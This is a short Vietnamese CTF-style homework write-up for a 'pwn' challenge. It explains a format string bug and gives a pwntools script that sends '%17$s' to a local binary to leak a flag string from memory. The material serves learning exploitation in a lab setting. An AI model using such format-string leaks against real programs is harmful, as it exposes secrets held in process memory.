# Bài tập về nhà PWN

## 1. chall 1
- Dễ thấy bài nãy bị dính lỗi fmt, trên stack chứa con trỏ heap tới chuỗi ```flag``` nên ý tưởng là dùng định dạng ```%s``` để in chuỗi đó ra.
```py
from pwn import *

baitap = process("./chall1")

baitap.sendline('%17$s')
print(baitap.recv())
```

